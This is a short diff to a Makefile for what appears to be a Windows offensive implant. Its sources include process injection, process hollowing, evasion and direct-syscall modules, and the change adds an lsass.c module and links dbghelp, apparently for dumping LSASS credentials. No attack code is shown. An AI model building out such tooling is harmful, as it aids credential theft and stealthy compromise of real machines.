@@ -8,11 +8,11 @@ CC          = x86_64-w64-mingw32-gcc
 NASM        = nasm
 STRIP       = x86_64-w64-mingw32-strip
 CFLAGS      = -Wall -O2 -Iinclude
-LDFLAGS     = -lntdll -lbcrypt -lwinhttp -lcrypt32 -liphlpapi -lws2_32 -lgdi32 -lshlwapi
+LDFLAGS     = -lntdll -lbcrypt -lwinhttp -lcrypt32 -liphlpapi -lws2_32 -lgdi32 -lshlwapi -ldbghelp
 BUILD_DIR   = build
 
 SRC         = src/api.c src/syscalls.c src/crypto.c src/injection.c \
-              src/hollowing.c src/transport.c src/msgpack.c src/evasion.c src/main.c
+              src/hollowing.c src/lsass.c src/transport.c src/msgpack.c src/evasion.c src/main.c
 ASM_SRC     = asm/syscalls.asm
 ASM_OBJ     = $(BUILD_DIR)/syscalls.obj
 
